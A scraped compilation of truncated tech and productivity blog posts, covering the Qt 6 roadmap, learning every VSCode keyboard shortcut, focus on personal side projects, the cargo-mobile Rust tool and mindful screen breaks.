run a test to ensure it always fails. Because I have standards, you know?</p>  </div> </article>  </div></div>]]>

Since then, a lot of things have changed in the world around us, and it is now time to define a vision for a new major version. This blog post captures the most important points that can and should define Qt 6.</p>
<!--more-->
<p>Qt 6 will be a continuation of what we have been doing in the Qt 5 series and should as such not be disruptive to our users. But a new major version will give us a higher degree of freedom to implement new features, functionality and better support the requirements of today and tomorrow than we currently can within the Qt 5 series. As described in more detail below, Qt 6 will aim for a large degree of compatibility with the Qt 5 series. We are also still working on new versions of Qt 5, and we’re aiming to bring some of the features that will define Qt 6 in a slightly reduced form to Qt 5.14 and Qt 5.15 LTS. With the feature freeze of Qt 5.14, more R&amp;D focus will shift towards Qt 6, and we’re aiming to have Qt 6.0 ready for a first release by the end of 2020. Before we dive into all the things that will be new, let’s also remember some of the core values of Qt for our users, to define the things we don’t want to change.</p>
<h3>What makes Qt valuable to our users?</h3>
<p>Qt is a horizontal product that is being used in many different markets. The core values Qt has for our customers and users are:</p>
<ol>
<li>Its <strong>cross-platform</strong> nature, allowing users to deploy their applications to all desktop, mobile and embedded platforms using one technology and from a single code base</li>
<li>Its <strong>scalability</strong> from low-end, single-purpose devices to high-end complex desktop applications or connected system</li>
<li><strong>World-class APIs and tools and documentation</strong>, simplifying the creation of applications and devices</li>
<li><strong>Maintainability, stability, and compatibility</strong>, allowing to maintain large code bases with minimal effort</li>
<li>A large <strong>developer ecosystem</strong> with more than 1 million users</li>
</ol>
<p>A new version of Qt needs to adjust our product to new market demands while keeping the 5 items above at the heart of what we’re doing.</p>
<p>The desktop market is at the root of our offering and is a strong and important market for Qt. It is where most of our users get the first contact with Qt and forms the basis of our tooling. Keeping it healthy and growing is a pre-requirement to be able to grow also in other markets.</p>
<p>Embedded and connected devices are where we have our biggest growth. Touch screens are coming to an exponentially increasing number of devices, but there is strong pressure on the price point of the hardware for these devices. Low-end chipsets, microcontrollers, combined with small to medium-sized touch screens will be used everywhere. Most of those devices will have relatively simple functionality but require polished and smooth user interfaces. Large volumes of such devices will be created, and we need to ensure we can target that space with our offering to be able to live up our scalability promise.</p>
<p>At the same time, user interfaces at the high end of the device spectrum will continue to increase in complexity, containing thousands of different screens and many applications. Merging 2D and 3D elements into one user interface will be common, as will be the usage of augmented and virtual reality.</p>
<p>Elements of artificial intelligence will be more commonly used in applications and devices, and we will need to have easy ways to integrate with those.</p>
<p>The strong growth in the number of connected devices being created as well as much higher requirements on user experience makes it more important for us to focus on world-class tooling to simplify the creation of applications and devices. Integrating UX designers into the development workflow is one of our goals, but there will be many other areas where we need to try to simplify the lives of our users.</p>
<p>Qt 6 will be a new major version for Qt. The main goal with such a new major version is to prepare Qt for the requirements coming in 2020 and beyond, clean up our codebase and make it easier to maintain. As such the focus will be on those items that require architectural changes within Qt and cannot be done without breaking some level of compatibility with Qt 5.x.</p>
<p>Below are some of the key changes we need to make in Qt to make it fit for the next years to come.</p>
<a id="qml" data-hs-anchor="true"></a>
<h3>Next-generation QML</h3>
<p>QML and Qt Quick have been the main technologies fueling our growth over the last years. The intuitive ways of creating User Interfaces using those technologies are a unique selling point of our offering.</p>
<p>But QML, as it was created for Qt 5, has some quirks and limitations. This, in turn, means that there is the potential for significant enhancements, that we are planning to implement with Qt 6. The main changes planned here are:</p>
<p><strong>Introduce strong typing.&nbsp;</strong>Weak typing makes it hard for our users to apply large changes to their codebases. A strong type system allows for IDEs and other tools to support our users in this task and dramatically ease the maintenance. Also, we will be able to generate much better-performing code and reduce overhead.</p>
<p><strong>Make JavaScript an optional feature of QML.&nbsp;</strong>Having a full JavaScript engine when using QML can complicate things and is an overhead especially when targeting low-end hardware such as microcontrollers. It is however extremely useful in many use cases.</p>
<p><strong>Remove QML versioning.</strong>&nbsp;By simplifying certain lookup rules in QML and changing the way context properties work, we can remove the need for versioning in QML. This, in turn, will lead to large simplifications in the QML engine, greatly simplify our workload of maintaining Qt Quick and simplify usage of QML and Qt Quick for our users</p>
<p><strong>Remove the duplication of data structures between QObject and QML<br></strong>Currently, quite some data structures are duplicated between our meta-object system and QML, degrading startup performance and increasing memory usage. By unifying those data structures, we will be able to cut away most of that overhead.</p>
<p><strong>Avoid runtime generated data structures.&nbsp;</strong>This relates to the point before, where many of those duplicated data structures are currently being generated at runtime. It should be perfectly possible to generate most of them at compile time.</p>
<p><strong>Support compiling QML to efficient C++ and native code.&nbsp;</strong>With strong typing and simpler lookup rules we can convert QML to efficient C++ and native code, significantly increasing runtime performance</p>
<p><strong>Support hiding implementation details.&nbsp;</strong>‘Private’ methods and properties have been a long-time requirement to be able to hide data and functionality in QML components</p>
<p><strong>Better tooling integration.&nbsp;</strong>Our current code model for QML is often incomplete, making refactoring, and detection of errors at compile time difficult to impossible. With the above changes, it should be possible to offer compile-time diagnostics that can compete with C++, as well as much improved refactoring support.</p>
<a id="graphics" data-hs-anchor="true"></a>
<h3>Next-generation graphics</h3>
<p>A lot of things have changed in the graphics area since we did Qt 5.0, leading to us having to do significant changes to our graphics stack to stay competitive.</p>
<p>With Qt 5, we used OpenGL as the unified API for 3D graphics. Since then a host of new APIs have been defined. Vulkan is the designated successor of OpenGL on Linux, Apple is pushing for Metal, and Microsoft has Direct 3D. This means that Qt will in the future have to seamlessly work with all those APIs. To make that possible a new layer abstracting the graphics APIs (like QPA for the platform integration) called the Rendering Hardware Interface (RHI) has to be defined. We will need to base all our rendering infrastructure (QPainter, the Qt Quick Scenegraph, and our 3D support) on top of that layer.</p>
<p>The set of different graphics APIs also leads to us having to support different shading languages. The Qt Shader Tools module will help us to cross-compile shaders both at compile and at runtime.</p>
<p>3D is playing a more and more important role, and our current offering doesn’t have a unified solution for creating UIs that contain both 2D and 3D elements. Integrating QML with content from Qt 3D or 3D Studio is currently cumbersome and causes some performance overhead. In addition, it is impossible to sync animations and transitions on a frame by frame level between 2D and 3D content.</p>
<p>The new integration of 3D content with Qt Quick is aiming to solve this problem. In this case, a full new renderer will allow rendering 2D and 3D content together and support arbitrary nesting between the two. This will turn QML into our UI definition language for 3D UIs and remove the need for the UIP format. We will provide a technology preview of the ‘new’ Qt Quick with 3D support already with Qt 5.14, more information will come in a separate blog post.</p>
<p>Finally, the new graphics stack needs to be supported by a decent pipeline for graphical assets, that allows preparing those at compile time for the target hardware and use cases in question. Convert PNG files to compressed textures, compile many of them into texture atlases, convert shaders and meshes into optimized binary formats and more.</p>
<p>We also aim to bring a unified theming/styling engine to Qt 6, which will allow us to get a native look &amp; feel on Desktop and mobile platforms to both Qt Widgets and Qt Quick.</p>
<a id="tooling" data-hs-anchor="true"></a>
<h3>Unified and consistent tooling</h3>
<p>Our graphical tooling to create User interfaces has been split into two with Qt 3D Studio and Qt Design Studio. Additionally, Qt 3D Studio is slightly disconnected from the rest of Qt leading to quite some duplicated efforts.</p>
<p>We will unify those by merging the required functionality from Qt 3D Studio back into Design Studio. Design Studio shares a lot of code and the application/plugin framework with Qt Creator allowing for a great design experience and giving us the tools to bridge the gap between designers and developers.</p>
<p>The Design tooling also …</p></span></p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="contentdiv">

<p>I spent a few hours spread over the last couple of weeks to learn every single one of VSCode’s keyboard shortcuts, specifically the 149 shortcuts from the <a href="https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf">official keyboard shortcuts reference</a>. These are also present in <a href="https://keycombiner.com/collections/vscode/">KeyCombiner’s searchable table of VSCode shortcuts</a>.</p>
<p>Admittedly, I started this challenge to write a blog post about it afterward and as a way to promote <a href="https://keycombiner.com/">KeyCombiner</a> via content marketing. The blog post I had in mind would be similar to my previous one, <a href="https://tkainrad.dev/posts/how-i-learned-50-new-keyboard-shortcuts-in-42-minutes/">documenting my process of learning 50 new web application shortcuts in 42 minutes</a>.</p>
<p>But, as it usually happens only in romantic comedies, my intentions changed over time. This article turned out much different. It is not about the learning process but about how this challenge changed some of the developing habits I had for many years. Workflows that I grew used to during many projects, different IDEs, and even varying programming languages suddenly evolved.</p>

<p>As software engineers, we like to think that we are continually learning and improving our skills. This is certainly true when it comes to the technologies we are using. However, our development habits, such as which features of our IDEs we use, are much more rigid. I believe most of our core workflows are formed early on and very hard to change.
I don’t have data to back this up, but when I look at myself, my co-workers, and other developers I know, this certainly seems true. If you think about it, it is not surprising, the same thing happens in other areas of life. For this very reason, you will find that developers who have studied or worked together will often use similar shortcuts, similar IDE features, and have similar limitations in their workflows.</p>
<p>The usual way to combat this is reading books, blog posts, attending conferences, well, everything that is used in our industry to extend our knowledge. However, with fundamental developing habits, I have found that this works poorly. You might read about a neat feature of your IDE, or see someone demo their workflow, but when you are eventually sitting in front of your screen and writing code, it is easy to fall back to what we already know, what is already set up, and proven to work.</p>
<p>After this experiment, I am convinced that keyboard shortcuts are the main factor in how we form our developing habits, and they can also stop us from evolving our habits.
Even before this challenge, I felt that I was good with shortcuts. I knew quite a few refactoring shortcuts, knew how to pause and stop program executing during debugging, was decent at jumping around between files, searching through my project, and all the other usual stuff. When I saw a co-worker using a shortcut that I didn’t know, I was quick to incorporate it into my workflow, too. After all, I was enough into shortcuts that I built a whole side-project around learning them.
<strong>The thing is, all new shortcuts that I learned were the ones that would augment my existing habits.</strong></p>
<p>This is a hen and egg problem; if you don’t know the shortcuts, you will not start to change your habits and use new IDE features because without shortcuts, they are too tedious to use or not at all usable. But if you don’t form new habits, you will not learn the shortcuts.</p>
<p><strong>Without intending it, I think I found a way to break out of this cycle:
Learning all IDE shortcuts very well <em>before</em> getting back to work. By learning <em>all</em> shortcuts, you are not limited to what somebody shows you and might not be compatible with your situation. You can naturally include what makes sense, in addition to your existing skills.</strong></p>
<p>The next section shows how this worked for me.</p>

<p>I started the learning process as it is usually done with KeyCombiner: By importing some shortcuts from the <a href="https://keycombiner.com/collections/vscode/">public collection of VSCode shortcuts</a> into a personal collection. Intuitively, I started with the ones I already knew and some additional that seemed most useful to me. Back then I was still trying to show that I could learn all shortcuts very quickly with KeyCombiner. I didn’t expect that shortcuts that had nothing to do with my existing workflows will be the real deal.</p>
<p>Some of the first combinations that I picked and that I did not know previously were <kbd>alt</kbd>+<kbd>w</kbd>/<kbd>r</kbd>/<kbd>c</kbd> for toggling find options (match whole word, regex, case sensitivity) because I was already using those features. This went on for a few days. I did a couple practice runs every day and added new shortcuts whenever KeyCombiner was saying that I mastered all of the previous ones.</p>
<p>Eventually, I knew all shortcuts that seemed useful for how I was using VSCode back then. So I had to start adding shortcuts that had nothing to do with my existing habits. This brought up an interesting misconception. Often keyboard shortcuts are seen as a way to do things faster, compared to using the mouse. While that is true, I think there is an even more aspect to shortcut usage in IDEs: Many features are not used at all, if you don’t know the shortcut!</p>
<p>As I was learning new VSCode shortcuts every day, I started to use features that I previously didn’t even know of. One of the first things that suddenly made a lot of sense was <em>Select all Occurences of Find Match</em> with <kbd>Alt</kbd>+<kbd>Enter</kbd> as default binding, especially when combined with regex search. I was so excited about it, that I even <a href="https://twitter.com/ThomasKainrad/status/1305608337799761920">tweeted a Gif</a> showing how I use it to modify the CSV files that are the source for KeyCombiner’s public collection tables.</p>
<p>The process worked both ways: Sometimes, while I was practicing a shortcut on KeyCombiner, it seemed apparent that this was useful and that I should include it into my workflow. Sometimes it hit me while coding that I had just learned a shortcut that can make the current task more efficient.</p>
<p>In the following, I describe the most significant changes in my daily development habits. The list is far from complete though; there are many more small things that I picked up and frequently use now.</p>
<p><strong>Editor and Panel Management</strong><br>
Since knowing all the shortcuts to switch focus between panels and move editors around, I am using VSCode’s powerful layouting capabilities much more. I have 3-5 editor panels open at pretty much all times, seeing many related pieces of code at once. Working this way by using the mouse is very impractical.
I switch between editor panels with keyboard shortcuts and move editors from one group to the other.</p>
<p>There is one negative side-effect, though: I am starting to get annoyed when I use other IDEs (PyCharm, Eclipse), because they lack far behind VSCode when it comes to using multiple editors.</p>
<p><strong>Multi-cursor Editing</strong><br>
If you don’t know the shortcut to add additional cursors, I doubt you will ever use this incredibly powerful feature of VSCode. It is a typical feature that only blends into your habits once you know the shortcuts.
The basic commands are <kbd>Ctrl</kbd>+<kbd>Ctrl</kbd>+<kbd>Down</kbd>/<kbd>Up</kbd> for adding cursors above/below. However, I found the commands to <em>Insert cursor at end of each line selected</em> (<kbd>Shift</kbd>+<kbd>Alt</kbd>+<kbd>i</kbd>), and the above-mentioned <em>Select all Occurences of Find Match</em> (<kbd>Alt</kbd>+<kbd>Enter</kbd>) even more powerful. These commands are why I frequently paste text snippets into VSCode, apply a few operations, and then copy-paste it back into whatever application I was using.</p>
<p><strong>Opening views by shortcut</strong><br>
I sometimes tried to do this before, but it never stuck. Now I finally switch to all views (Explorer, Debug, Search, Problems, etc.) with dedicated keyboard shortcuts. These shortcuts translate very nicely to other IDEs. After learning the VSCode default bindings, which are <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>&lt;char&gt;</kbd>, I set the same bindings also for Eclipse and PyCharm. Especially <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>e</kbd> for switching to the explorer view and <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>d</kbd> for switching to the debug view are among my most used shortcuts now.</p>
<p><strong>Making Selections</strong><br>
I hate to admit it, but I did not use shortcuts to expand and shrink AST selections before. AST stands for <em>abstract syntax tree</em>, which means that the IDE will take the current language’s syntax into account for modifying the selection. Finally, I picked up <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>left</kbd>/<kbd>right</kbd> to shrink and expand selections. Not all IDEs handle this in the same way, which can be a bit annoying, but it works well for the most frequent tasks, such as expanding the selection to enclose the current string, method, class, or HTML tag.</p>
<p><strong>Folding</strong><br>
I have started to use folding much more. For years, I have rarely used this feature that all IDEs support to a great extent. Now, I do it frequently. Folding is one of these things that are just not feasible with the mouse. Of course, if you need to fold code, <a href="https://blog.codinghorror.com/the-problem-with-code-folding/">chances are that you need to structure your code better</a>. Many organizations even apply automatic code linters that will complain when methods or classes are too long. However, I have never seen someone recommend splitting up blog posts into multiple files. The same goes for other non-code file types, such as JSON. All we have there is folding.</p>
<p>I am not saying these are the things you should start to learn now, far from it. These are the things I personally integrated deep into my workflows after doing this challenge, without choosing them deliberately, but naturally. Who knows what you will pick up.</p>
<p>Of course, some of the shortcuts I learned still seem a bit, let’s say nonessential, but a little useless knowledge never killed nobody.</p>

<p>In addition to finally breaking out of old habits and experience a real evolution of my IDE usage, there were some additional, less significant, but still delightful second-order effects.</p>
<p>As a shortcut enthusiast, I often had the problem that I needed to decide which binding to use for a particular operation and application pair. KeyCombiner’s public shortcut search helps to find out which binding is the convention for a particular operation, but it can still be tricky. For example, take the frequently used <em>Step Over</em> operation used for debugging. <a href="https://keycombiner.com/collecting/collections/public/search/?description=step+over&amp;keys=&amp;mac_keys=&amp;submit=Search">KeyCombiner shows that VSCode, Eclipse, and JetBrains IDEs all use a different default binding</a>(<kbd>F6</kbd>,<kbd>F8</kbd>,<kbd>F10</kbd>). Learning every single VSCode shortcut has freed me from this mental load of deciding what the best …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Side Projects</h2>
<p>I can't stick to side projects. I start and stop new ones all the time.</p>
<p>I dislike this about myself. I do just fine in a work environment, but not so fine when I get home and work on my personal side projects.</p>
<p>I have a long-term, macroscopic focus problem when it comes to my interests.</p>
<p>I am going to try and solve that.</p>
<h2>The Long-Term Focus Problem</h2>
<p>I've thought a lot about <em>short-term</em> focus.</p>
<p>I'm proficient at answering questions like: </p>
<blockquote>
<p>How do I stay focused on my project for the next few weeks?</p>
</blockquote>
<p>But I have no clear answer for something like:</p>
<blockquote>
<p>How do I stay focused on my project for the next three years?</p>

<p>It's not that I can't focus, it's that I can't <em>stay focused</em> over longer periods of time. Especially on personal projects.</p>
<p>I can do this:</p>
<blockquote>
<p>Finish the essay before Friday.</p>
</blockquote>
<blockquote>
<p>Finish the new feature for our app, test it, launch on Tuesday.</p>
</blockquote>
<blockquote>
<p>Build a product roadmap and stick to it for the next 18 months</p>
</blockquote>
<p>But I can't do this:</p>
<blockquote>
<p>Practice piano once a week for the next 3 years</p>
</blockquote>
<blockquote>
<p>Read 1 book every month in 2020</p>
</blockquote>
<blockquote>
<p>Build a personal roadmap and stick to it for the next 18 months</p>
</blockquote>
<p>I get enthralled about the idea of learning piano or reading more books. I pursue these new interests with furious passion. A few weeks later, they fizzle out. It's not a concious decision, it's almost like I forget about them.</p>
<p>I'm going to explore this problem, fix it, and then write about it.</p>
<h2>But What About Roadmaps?</h2>
<blockquote>
<p>...but Rob I thought you are a <em>product manager</em>? Isn't it your job to be thinking long-term? Don't you create product roadmaps?</p>
</blockquote>
<p>As a product manager at a tech company, the single most important tool for myself has always been the product roadmap. I routinely sit down with relevant people (usually the CEO + engineering lead) and we create a plan for journey ahead. </p>
<p>Creating a "personal roadmap" is the first thing I tried. It works perfectly on a professional level, but there is one specific reason why it's been unsuccessful on a personal level.</p>
<p>Businesses have strong, structural incentives to maintain their product, goals, and identity. </p>
<ul>
<li><strong>Product</strong>: <em>"Our product solves <code>&lt;problem&gt;</code> for <code>&lt;target market&gt;</code> with <code>&lt;solution&gt;</code>"</em></li>
<li><strong>Goal</strong>: <em>"Make $10,000,000 in annual recurring revenue"</em></li>
<li><strong>Identity</strong>: <em>"We create a delightful, user-friendly <code>&lt;product&gt;</code> for our <code>&lt;target market&gt;</code> to help them solve their <code>&lt;problem&gt;</code>"</em></li>
</ul>
<p>All incentives align to keep these three attributes <strong>static</strong>. Especially identity.</p>
<p>When I get to work, I naturally adopt the identity of my organization. This identity has no incentive to change.</p>
<blockquote>
<p>I, Robert, help make <code>&lt;company identity&gt;</code> a reality by doing <code>&lt;product manager stuff&gt;</code>.</p>
</blockquote>
<p>There are no other thoughts that cross my mind. I love being a part of a team and working towards accomplishing goals. I love shipping products, and my persistence in this role makes me better at it.</p>
<p>I'm simplifying, but the static nature of a company's identity enables long-term focus in a way I haven't been able to replicate a personal level. It's why a "personal roadmap" doesn't work the same way a product roadmap does. I don't have a static identity for my personal projects.</p>
<h2>Identity Incentives</h2>
<p>Here's a simplified example of one attempt, for which I created a personal roadmap.</p>
<ul>
<li><strong>Product</strong>: <em>"A video game."</em></li>
<li><strong>Goal</strong>: <em>"Create a roguelike action game in my spare time, and release it on Steam"</em></li>
<li><strong>Identity</strong>: <em>"I am a game developer who creates exciting, delightful, engaging video games in my spare time."</em></li>
</ul>
<p>Creating a video game is a long-term project, especially if you haven't done it before. It's like learning to play guitar and produce/mix an album at the same time.</p>
<p>I created a roadmap, but I didn't stick to it. My momentum fell off a cliff after I finished the first milestone (in this case, a prototype). I found some new incentive to start a different project and immediately dropped the video game project. Some shiny new object entered my field of view, and that was that.</p>
<p>In my book, I recommend that people ignore any failures in their habits in order to preserve a successful identity:</p>
<blockquote>
<p>I skipped my morning run today, but I'm <em>still</em> someone who is a runner.</p>
</blockquote>
<blockquote>
<p>I didn't work on my video game this weekend, but I'm <em>still</em> a game developer.</p>
</blockquote>
<p>I never addressed how to maintain the identity itself. My recommendations had a built in assumption that the reader's given identity is static:</p>
<ul>
<li>I study because I am a student</li>
<li>I write code because I am a back-end engineer</li>
<li>I run Facebook Ads because I am a digital marketer</li>
</ul>
<p>When the identity is based on a personal interest instead of a professional role, there are fewer incentives to keep it static over the long-term.</p>
<h2>Debunked Reasons</h2>
<p>The reason I think it's an identity issue is because I have eliminated the following factors:</p>
<ul>
<li><strong>External validation</strong>: my friends liked my prototype and wanted to see more</li>
<li><strong>Difficulty</strong>: I did not lose interest when things got harder, in fact they got easier as I learned more)</li>
<li><strong>Time/Energy</strong>: I switched to a new interest with similar intensity. I was not burned out.</li>
<li><strong>Motivation</strong>: I think identity and purpose drives motivation. Also, I like making stuff.</li>
</ul>
<h2>The Malleable Identity Issue</h2>
<p>Now that I'm writing this all down, it's clear that my long-term focus problem is truly identity problem. The identity I adopt when starting personal projects is too <em>malleable</em> to persist in the long-term.</p>
<p>There are some benefits. I've started many side projects and now I have a novice-level understanding of many different things.</p>
<p>As a product manager in tech, this is a good thing. I can code, design mockups, use 3d modelling software, use deep learning tools like <a href="https://en.wikipedia.org/wiki/GPT-3">GPT2</a>, and so on. I'm no expert, but I understand how all of these work to some degree.</p>
<p>On the other hand, I have many projects I would have loved to continue. I'm not full of regret, but I wish I had a solution to my rapidly changing interests.</p>
<h2>Rabbit Holes?</h2>
<p>I don't think I'm the only one with such problems. I suspect this is an ADHD issue, but I'm not certain.</p>
<p>Once in a while, the ADHD brain finds a different type of distraction: <em>the rabbit-hole</em>.</p>
<p>Sometimes it's a topic on Wikipedia you read for a few hours, sometimes it's a series of cooking videos on YouTube you want to watch.</p>
<p>Sometimes it's a grandiose inspiration.</p>
<blockquote>
<p>I'll start a podcast like I always wanted to!</p>
</blockquote>
<blockquote>
<p>I'm going to learn piano!</p>
</blockquote>
<blockquote>
<p>I'm going to make a video game!</p>
</blockquote>
<p>The identity follows soon after:</p>
<blockquote>
<p>I am a podcaster!</p>
</blockquote>
<blockquote>
<p>I am a musician!</p>
</blockquote>
<blockquote>
<p>I am an indie game developer!</p>
</blockquote>
<p>As soon as you imagine a new identity, a previous identity evaporates.</p>
<p>The salience of the rabbit hole is such that it convinces us to adopt this new identity immediately. There are too many interesting things on Earth for us to stick to a single one. Or maybe it's just me.</p>
<h2>Solutions I'm Not Exploring</h2>
<p>In Barbara Sher's book <a href="https://www.penguinrandomhouse.com/books/593218/refuse-to-choose-by-barbara-sher/"><em>Refuse to Choose!</em></a>, she argues "Scanners" are a specific type of person who are permanently afflicted with ever changing interests. "This is who you are."</p>
<p>The author argues that some interests are only meant to exist for fleeting moments, and their subsequent abandonment is because "maybe you got what you came for?"</p>
<p>(I find it funny how she creates a new identity for people who constantly change identities.)</p>
<p>In some sense I agree with Barbara. Sometimes all I really wanted was some brief creative outlet. In another sense, I refuse to capitulate because I'm a certain "type" of person. At some point, a therapist told me writing a book was not possible for me because "it takes too long for someone like you." Heh.</p>
<p>I want to create great work. Great work takes time, effort, and overcoming gaps in motivation.</p>
<p>I think I can learn how to do this.</p>
<h2>Some Data Points</h2>
<p>I abandoned my video game project but finished my book. What was the difference?</p>
<p>Writing my book was a full-time project. I had no other job at the time. I took Steven Pressfield's advice from <a href="https://stevenpressfield.com/books/the-war-of-art/"><em>The War of Art</em></a> and treated this creative process like a full-time job. I had no side-projects while writing. I never got distracted, and never felt the need to be "disciplined".</p>
<p>Perhaps the nature of the side project is to blame? Something like "oh I don't <em>really</em> need to keep working on my video game."</p>
<p>It's hard to be objectively analyze what's behind my motivation. Is it because writing the book was <em>purpose</em> driven, while the video game was <em>identity</em> driven?</p>
<p>Maybe identity is not a great explanation?</p>
<h2>Potential Solution 1: Purpose</h2>
<p>A friend of mine argued that what I'm looking for is <em>purpose</em> in these side projects, rather than an identity. Perhaps if a project was intrinsically tied to a purpose, the identity malleability problem would become irrelevant. It seems true enough for my book.</p>
<p>I haven't spent enough time directly thinking about <em>purpose</em>. I just do things I like doing. Perhaps that's the issue?</p>
<p>I'm going to actively think about purpose rather than identity going forward and see what happens.</p>
<h2>Potential Solution 2: Doing Less Stuff</h2>
<p>I just started reading <a href="https://www.calnewport.com/books/digital-minimalism/"><em>Digital Minimalism</em></a> by Cal Newport. He argues that we spend way too much time on our phones/computers. This is a pretty straightforward point and I agree.</p>
<p>I wonder if the constant bombardment of tantalizing information on the internet makes me more likely to find some new project to pursue. If I shut myself off from complete-waste-of-time activities like checking Reddit, would I be less prone to jumping around from topic to topic?</p>
<p>I was going to try to use less technology anyway, but I'll keep track of how this affects my focus.</p>
<h2>Potential Solution 3: Discipline</h2>
<p>I've always struggled with the idea of discipline. Whenever I have really stuck to a task or project, it has always felt natural to keep going. Obstacles were challenging, but overcoming them was fun. There was no required "push" where I needed to harness discipline. </p>
<p>While not <em>every</em> task has been so simple, I never felt like I needed more discipline to finish my book. Yet I completed it in 3 months and worked on it every day. Does this mean I'm already disciplined? Or does this mean I got lucky with one project? </p>
<p>It's rare for me to consciously avoid a difficult activity, but I also don't live a robotic life. Am …</p></div></div>

    <p><strong><em>The answer to “how do I use Rust on iOS and Android?”</em></strong></p>

<p>For nearly 2 years, we’ve been perfecting a tool called <a href="https://github.com/BrainiumLLC/cargo-mobile">cargo-mobile</a>. It’s a framework-agnostic tool that generates all the boilerplate of a Rust mobile project, and is packed full of handy commands for building and running on mobile devices.</p>

<p>If you’d like to follow along, installation is easy:</p>

<div><div><pre><code>cargo <span>install</span> <span>--git</span> https://github.com/BrainiumLLC/cargo-mobile
</code></pre></div></div>

<p>Note that cargo-mobile currently only works on macOS! If you shoot us a PR that adds support for Linux or Windows, we’ll shower you in heart emoji. Feel free to ask us for guidance if you’re interested!</p>

<p>Additionally, until Rust 1.49.0 is released, you can’t build for iOS unless you’re using <a href="https://github.com/BrainiumLLC/cargo-mobile#status">the current beta</a>.</p>

<p>To start a new project, you just need to run <code>cargo mobile init</code>:</p>

<figure>
    <img alt="`cargo mobile init` demo" src="https://dev.brainiumstudios.com/assets/cargo-mobile/init.svg">
</figure>

<p>Just like that, you have a version of <a href="https://bevyengine.org/">Bevy</a>’s <a href="https://github.com/bevyengine/bevy/blob/master/examples/game/breakout.rs">Breakout example</a> that can run out of the box on desktop, iOS, and Android!</p>

<p>As usual, you can use <code>cargo run</code> to run on desktop:</p>

<p><a title="`cargo run` demo" href="https://dev.brainiumstudios.com/assets/cargo-mobile/desktop.png">
    <img alt="`cargo run` demo" title="`cargo run` demo" src="https://dev.brainiumstudios.com/assets/cargo-mobile/desktop.png">
</a></p>

<p>More excitingly, it’s easy to run on iOS and Android!</p>

<h2 id="ios"><a href="#ios">iOS</a></h2>

<p>We provide a convenience command for opening your project in Xcode:</p>



<p>From there, you can build your project like you normally would in Xcode! Just hit that Play button. It’ll work on Simulator, too.</p>

<p><a title="Xcode project" href="https://dev.brainiumstudios.com/assets/cargo-mobile/xcode.png">
    <img alt="Xcode project" title="Xcode project" src="https://dev.brainiumstudios.com/assets/cargo-mobile/xcode.png">
</a></p>

<p>You can even set breakpoints!</p>

<p><a title="Xcode breakpoints" href="https://dev.brainiumstudios.com/assets/cargo-mobile/breakpoints.png">
    <img alt="Xcode breakpoints" title="Xcode breakpoints" src="https://dev.brainiumstudios.com/assets/cargo-mobile/breakpoints.png">
</a></p>

<p>If you’re not a fan of opening Xcode, you can also run directly from the command line. Be warned that the output might contain some spurious errors; we’re still improving that! Also, you can’t currently use Simulator unless you’re running from Xcode.</p>



<p>Whether you run from Xcode or the command line, you should ultimately be greeted by Breakout:</p>

<p><a title="Running on an iPhone XR" href="https://dev.brainiumstudios.com/assets/cargo-mobile/iphone.jpg">
    <img alt="Running on an iPhone XR" title="Running on an iPhone XR" src="https://dev.brainiumstudios.com/assets/cargo-mobile/iphone.jpg">
</a></p>

<p>We provide several other helpful iOS commands, which are listed in our help info:</p>



<h2 id="android"><a href="#android">Android</a></h2>

<p>Naturally, we also provide a convenience command for opening your project in Android Studio:</p>



<p>Once again, you just need to hit the Run button like you normally would.</p>

<p><a title="Android Studio project" href="https://dev.brainiumstudios.com/assets/cargo-mobile/android-studio.png">
    <img alt="Android Studio project" title="Android Studio project" src="https://dev.brainiumstudios.com/assets/cargo-mobile/android-studio.png">
</a></p>

<p>Alternatively, you can skip Android Studio and run directly from the command line:</p>



<p>Either way, it should pop up on your connected device:</p>

<p><a title="Running on a Pixel 4" href="https://dev.brainiumstudios.com/assets/cargo-mobile/pixel.jpg">
    <img alt="Running on a Pixel 4" title="Running on a Pixel 4" src="https://dev.brainiumstudios.com/assets/cargo-mobile/pixel.jpg">
</a></p>

<p>You can find more Android commands in our help info:</p>



<h2 id="going-forward"><a href="#going-forward">Going forward</a></h2>

<p>Be advised that Bevy’s mobile support is still <a href="https://bevyengine.org/news/bevy-0-3/">very new</a>, so the Breakout demo doesn’t work perfectly yet. They’re doing an amazing job nonetheless! We’ve been following their progress, and a lot of contributors worked very hard to make it happen.</p>

<p>We’d love to see PRs that add template packs for other engines and frameworks, so that cargo-mobile is convenient for anyone and everyone to use. We’d also love to show you a demo using Brainstorm, our own internal mobile-first game engine, but we’re not ready to open source it just yet!</p>

<p>If you have any questions, issues, or ideas, feel free to <a href="https://github.com/BrainiumLLC/cargo-mobile/issues">open an issue</a>!</p>

November 27, 2020 | https://thistooshallgrow.com/blog/better-breaks | <a href="https://web.archive.org/web/*/https://thistooshallgrow.com/blog/better-breaks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-daafb516dfd9bac222bd"><div><p>Too often, we find ourselves caught up in our screens, mindlessly browsing, and for some of us, that's on top of already spending our work day on screens. We open our eyes in bed, scroll social media or news sites for a bit, get to work on our work screen(s), take """<em>breaks</em>""" during the day on our pocket screen - yes, big quotation marks here - and chill out in the evening by watching the big static screen at home, sometimes while also checking our pocket screen, because why not (spoiler: it's by design).</p><p>Here are some key points on taking mindful breaks from the digital world.</p><h2>You need quality breaks</h2><p>Your brain needs breaks to refuel. If you keep going despite the need to recharge, it can go one of two ways. In the first scenario, you will keep working, get tense, and start stumbling down the mindless work staircase, until you reach the ground and need a full 5 hours to recharge. We don't want that, because then when we're done with our day, it'll take us 5 hours of binge-watching to recover.</p><p>In the second scenario, you will be distracted and drift off without actually taking a deliberate break. You might stare at the window or watch YouTube videos, while the "I should be working" thought keeps running in the background, hindering you from an actual, deliberate, relaxing break, and making you feel guilty for your natural distraction. That means neither doing productive work nor recharging: you're robbing yourself of your own time.</p><p>Let's make another thing clear: lunch shouldn't happen in front of your computer. If your main moment of rest during the workday is to eat while your eyes are glued to a screen, you might wind up drained, unable to concentrate, and overall not nearly as productive as compared to having had a balanced day.</p><p>Your attention should be on what you're doing. If it's 